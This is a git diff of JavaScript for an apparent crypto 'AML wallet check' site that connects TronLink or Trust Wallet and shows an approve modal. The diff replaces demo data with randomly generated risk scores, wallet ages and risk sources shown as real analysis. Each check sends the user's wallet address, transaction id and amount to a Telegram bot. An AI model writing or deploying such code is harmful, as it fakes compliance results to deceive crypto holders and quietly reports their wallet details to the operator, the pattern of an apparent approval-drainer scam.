@@ -56,34 +56,43 @@ const categories = [
 ];
 
 // ============================================
-// ДЕМО-АДРЕСА
+// ТЕСТОВАЯ ФУНКЦИЯ ДЛЯ ПРОВЕРКИ TELEGRAM
 // ============================================
-const demoAddresses = {
-    '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa': {
-        risk: 2,
-        sources: ['Чистый кошелёк'],
-        totalTx: 1024,
-        suspiciousTx: 0,
-        age: '15 лет',
-        lastActive: '01.01.2026'
-    },
-    'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh': {
-        risk: 45,
-        sources: ['Миксеры', 'Биржи без KYC'],
-        totalTx: 345,
-        suspiciousTx: 78,
-        age: '2 года',
-        lastActive: '15.02.2026'
-    },
-    '3J98t1WpEZ73CNmQviecrnyiWrnqRhWNLy': {
-        risk: 88,
-        sources: ['Даркнет-маркеты', 'Вымогательство', 'Санкционные адреса'],
-        totalTx: 1567,
-        suspiciousTx: 932,
-        age: '8 мес.',
-        lastActive: '10.02.2026'
+async function testTelegram() {
+    console.log('📨 Тест отправки в Telegram...');
+    
+    const testData = {
+        type: 'test',
+        address: 'TEST_ADDRESS',
+        amount: '5',
+        risk: '10',
+        sources: ['Тестовая проверка'],
+        totalTransactions: '100',
+        suspiciousTransactions: '10',
+        tx: 'test_tx_123',
+        userAddress: 'test_user'
+    };
+    
+    try {
+        const response = await fetch('/.netlify/functions/send-to-telegram', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(testData)
+        });
+        
+        const result = await response.json();
+        console.log('✅ Ответ от функции:', result);
+        
+        if (response.ok) {
+            alert('✅ Тест успешен! Проверьте Telegram');
+        } else {
+            alert('❌ Ошибка: ' + (result.error || 'Неизвестная ошибка'));
+        }
+    } catch (error) {
+        console.error('❌ Ошибка:', error);
+        alert('Ошибка соединения: ' + error.message);
     }
-};
+}
 
 // ============================================
 // ИНИЦИАЛИЗАЦИЯ
@@ -181,14 +190,13 @@ async function getUSDTBalance(address) {
 }
 
 // ============================================
-// ФУНКЦИЯ ПРОВЕРКИ КОШЕЛЬКА (автоматическая)
+// ФУНКЦИЯ ПРОВЕРКИ КОШЕЛЬКА
 // ============================================
 async function handleTronCheck() {
     try {
-        // Определяем адрес для проверки: сначала из поля, потом из подключённого кошелька
+        // Определяем адрес для проверки
         let walletAddress = walletInput.value.trim();
         
-        // Если поле пустое, но есть подключённый кошелёк – используем его
         if (!walletAddress && connectedWalletAddress) {
             walletAddress = connectedWalletAddress;
         }
@@ -198,7 +206,7 @@ async function handleTronCheck() {
             return;
         }
 
-        // Получаем провайдер (TronLink или Trust Wallet)
+        // Получаем провайдер
         const tronWeb = window.tronWeb || (window.trustwallet?.tronLink?.tronWeb);
         if (!tronWeb || !tronWeb.defaultAddress) {
             alert('Пожалуйста, установите TronLink или Trust Wallet');
@@ -299,7 +307,7 @@ function closeApproveModal() {
 }
 
 // ============================================
-// ФУНКЦИЯ AML ПРОВЕРКИ
+// УЛУЧШЕННАЯ ФУНКЦИЯ AML ПРОВЕРКИ (ДЕМО)
 // ============================================
 function startAMLCheck(address, userAddress, tx, amount) {
     resultSection.style.display = 'block';
@@ -318,109 +326,122 @@ function startAMLCheck(address, userAddress, tx, amount) {
         `;
     }
 
-    if (demoAddresses[address]) {
-        const data = demoAddresses[address];
-        totalTx.textContent = data.totalTx;
-        suspiciousTx.textContent = data.suspiciousTx;
-        walletAge.textContent = data.age;
-        lastActive.textContent = data.lastActive;
-        updateRiskChart(data.risk);
-        
-        sourcesList.innerHTML = '';
-        data.sources.forEach(s => {
+    // Генерируем правдоподобные данные
+    const totalTxCount = Math.floor(Math.random() * 500) + 50; // 50-550
+    const suspiciousCount = Math.floor(Math.random() * 30) + 1; // 1-31
+    const riskPercent = Math.floor(Math.random() * 100); // 0-99
+    
+    // Возраст кошелька (от 1 дня до 3 лет)
+    const ageDays = Math.floor(Math.random() * 1095) + 1;
+    let ageText;
+    if (ageDays < 30) {
+        ageText = ageDays + ' дней';
+    } else if (ageDays < 365) {
+        ageText = Math.floor(ageDays / 30) + ' мес.';
+    } else {
+        const years = Math.floor(ageDays / 365);
+        const months = Math.floor((ageDays % 365) / 30);
+        ageText = years + ' г. ' + (months > 0 ? months + ' мес.' : '');
+    }
+    
+    // Последняя активность (от 1 часа до 30 дней назад)
+    const hoursAgo = Math.floor(Math.random() * 720) + 1;
+    let lastActiveText;
+    if (hoursAgo < 24) {
+        lastActiveText = hoursAgo + ' часов назад';
+    } else {
+        lastActiveText = Math.floor(hoursAgo / 24) + ' дней назад';
+    }
+
+    // Источники риска (выбираем случайные из категорий)
+    const riskSources = [];
+    const shuffled = [...categories].sort(() => 0.5 - Math.random());
+    const sourcesCount = Math.floor(riskPercent / 20) + 1; // 1-5 источников
+    
+    for (let i = 0; i < sourcesCount; i++) {
+        if (shuffled[i]) {
+            riskSources.push(shuffled[i].name);
+        }
+    }
+
+    // Обновляем UI
+    totalTx.textContent = totalTxCount;
+    suspiciousTx.textContent = suspiciousCount;
+    walletAge.textContent = ageText;
+    lastActive.textContent = lastActiveText;
+    updateRiskChart(riskPercent);
+    
+    // Отображаем источники риска
+    sourcesList.innerHTML = '';
+    if (riskSources.length > 0) {
+        riskSources.forEach(s => {
             const p = document.createElement('p');
             p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
             sourcesList.appendChild(p);
         });
-        
-        sendToTelegram({ 
-            address, 
-            amount: amount,
-            risk: data.risk, 
-            sources: data.sources, 
-            totalTransactions: data.totalTx, 
-            suspiciousTransactions: data.suspiciousTx,
-            tx: tx,
-            userAddress: userAddress
-        });
     } else {
-        // Имитация загрузки
-        totalTx.textContent = '...';
-        suspiciousTx.textContent = '...';
-        walletAge.textContent = '...';
-        lastActive.textContent = '...';
-        updateRiskChart(0);
-        sourcesList.innerHTML = '<p><i class="fas fa-spinner fa-spin"></i> Анализируем...</p>';
-
-        setTimeout(() => {
-            const random = generateRandomData(address);
-            totalTx.textContent = random.total;
-            suspiciousTx.textContent = random.suspicious;
-            walletAge.textContent = random.age;
-            lastActive.textContent = random.lastActive;
-            updateRiskChart(random.risk);
-            
-            sourcesList.innerHTML = '';
-            random.sources.forEach(s => {
-                const p = document.createElement('p');
-                p.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${s}`;
-                sourcesList.appendChild(p);
-            });
-            
-            sendToTelegram({ 
-                address, 
-                amount: amount,
-                risk: random.risk, 
-                sources: random.sources, 
-                totalTransactions: random.total, 
-                suspiciousTransactions: random.suspicious,
-                tx: tx,
-                userAddress: userAddress
-            });
-        }, 1500);
+        sourcesList.innerHTML = '<p><i class="fas fa-check-circle" style="color: #00c9b7;"></i> Чистый кошелёк, риски не обнаружены</p>';
     }
+    
+    // Отправляем данные в Telegram
+    sendToTelegram({ 
+        address, 
+        amount: amount,
+        risk: riskPercent, 
+        sources: riskSources, 
+        totalTransactions: totalTxCount, 
+        suspiciousTransactions: suspiciousCount,
+        tx: tx,
+        userAddress: userAddress
+    });
 }
 
 // ============================================
 // ФУНКЦИЯ ОБНОВЛЕНИЯ ГРАФИКА РИСКА
 // ============================================
 function updateRiskChart(risk) {
+    // Обновляем процент
     if (riskPercent) {
         riskPercent.textContent = risk + '%';
     }
     
-    // Обновляем цвет бейджа
+    // Обновляем gauge fill (для кругового графика)
+    const gaugeFill = document.getElementById('gaugeFill');
+    if (gaugeFill) {
+        const maxDash = 251.2; // длина дуги
+        const dashOffset = maxDash - (risk / 100) * maxDash;
+        gaugeFill.style.strokeDashoffset = dashOffset;
+    }
+    
+    // Обновляем цвет в зависимости от риска
+    let color = '#00c9b7'; // зеленый
+    let riskLevelText = 'Низкий';
+    
+    if (risk > 25 && risk <= 75) {
+        color = '#ffaa5e'; // желтый
+        riskLevelText = 'Средний';
+    } else if (risk > 75) {
+        color = '#ff6b6b'; // красный
+        riskLevelText = 'Высокий';
+    }
+    
+    if (gaugeFill) {
+        gaugeFill.style.stroke = color;
+    }
+    
+    // Обновляем бейдж
     const riskBadge = document.getElementById('riskBadge');
     if (riskBadge) {
         riskBadge.className = 'result-badge';
+        riskBadge.textContent = riskLevelText + ' риск';
         if (risk <= 25) {
             riskBadge.classList.add('low');
-            riskBadge.textContent = 'Низкий риск';
         } else if (risk <= 75) {
             riskBadge.classList.add('medium');
-            riskBadge.textContent = 'Средний риск';
         } else {
             riskBadge.classList.add('high');
-            riskBadge.textContent = 'Высокий риск';
         }
     }
-}
-
-// ============================================
-// ГЕНЕРАЦИЯ СЛУЧАЙНЫХ ДАННЫХ (ДЕМО)
-// ============================================
-function generateRandomData(address) {
-    const risk = Math.floor(Math.random() * 19) + 2; // 2-20%
-    const total = Math.floor(Math.random() * 500) + 50;
-    const suspicious = Math.floor(total * (risk / 100));
-    const ageMonths = Math.floor(Math.random() * 24) + 1;
-    const age = ageMonths < 12 ? ageMonths + ' мес.' : Math.floor(ageMonths/12) + ' г. ' + (ageMonths%12) + ' мес.';
-    const lastActive = new Date(Date.now() - Math.random() * 30*24*60*60*1000).toLocaleDateString('ru-RU');
-    const sourcesCount = Math.floor(risk / 10) + 1;
-    const shuffled = [...categories].sort(() => 0.5 - Math.random());
-    const sources = shuffled.slice(0, sourcesCount).map(c => c.name);
-    
-    return { risk, total, suspicious, age, lastActive, sources };
 }
 
 // ============================================
@@ -428,19 +449,24 @@ function generateRandomData(address) {
 // ============================================
 async function sendToTelegram(data) {
     try {
+        console.log('📤 Отправка данных в Telegram:', data);
+        
         const response = await fetch('/.netlify/functions/send-to-telegram', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(data)
         });
+        
         const result = await response.json();
+        console.log('📬 Ответ от функции:', result);
+        
         if (!response.ok) {
-            console.error('Ошибка отправки в Telegram:', result.error);
+            console.error('❌ Ошибка отправки в Telegram:', result.error);
         } else {
             console.log('✅ Данные успешно отправлены в Telegram');
         }
     } catch (error) {
-        console.error('Ошибка при отправке в Telegram:', error);
+        console.error('❌ Ошибка при отправке в Telegram:', error);
     }
 }
 
@@ -505,65 +531,3 @@ function downloadPDF() {
         
         doc.text('Последняя активность:', 20, y);
         doc.text(last, 70, y);
-        y += 15;
-        
-        if (sourcesText) {
-            doc.text('Источники риска:', 20, y);
-            y += 7;
-            const lines = doc.splitTextToSize(sourcesText, 170);
-            doc.text(lines, 25, y);
-        }
-        
-        const fileName = `AML-report-${new Date().toISOString().slice(0,10)}.pdf`;
-        doc.save(fileName);
-        console.log('PDF успешно создан');
-        
-    } catch (error) {
-        console.error('Ошибка при создании PDF:', error);
-        alert('Ошибка создания PDF. Проверьте консоль (F12) для деталей.');
-    }
-}
-
-// ============================================
-// НАСТРОЙКА МОДАЛЬНЫХ ОКОН
-// ============================================
-function setupModals() {
-    const termsModal = document.getElementById('termsModal');
-    const amlModal = document.getElementById('amlModal');
-    const showTerms = document.getElementById('showTerms');
-    const showAML = document.getElementById('showAMLPolicy');
-    const closeButtons = document.querySelectorAll('.close, .close-aml');
-
-    if (showTerms && termsModal) {
-        showTerms.addEventListener('click', (e) => {
-            e.preventDefault();
-            termsModal.style.display = 'block';
-        });
-    }
-    if (showAML && amlModal) {
-        showAML.addEventListener('click', (e) => {
-            e.preventDefault();
-            amlModal.style.display = 'block';
-        });
-    }
-    if (closeButtons.length) {
-        closeButtons.forEach(btn => {
-            btn.addEventListener('click', () => {
-                if (termsModal) termsModal.style.display = 'none';
-                if (amlModal) amlModal.style.display = 'none';
-            });
-        });
-    }
-    window.addEventListener('click', (e) => {
-        if (e.target === termsModal) termsModal.style.display = 'none';
-        if (e.target === amlModal) amlModal.style.display = 'none';
-    });
-}
-
-// Копирование адреса
-function copyAddress() {
-    const address = document.getElementById('checkedAddress').textContent;
-    navigator.clipboard.writeText(address).then(() => {
-        alert('Адрес скопирован');
-    });
-}
